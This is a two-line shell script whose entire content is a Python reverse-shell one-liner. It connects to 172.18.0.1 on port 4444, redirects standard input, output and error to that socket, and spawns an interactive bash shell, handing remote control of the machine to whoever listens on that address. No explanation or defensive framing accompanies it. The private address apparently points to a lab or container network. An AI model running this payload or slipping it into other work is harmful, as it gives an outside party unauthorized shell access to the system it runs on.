#!/bin/sh
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("172.18.0.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
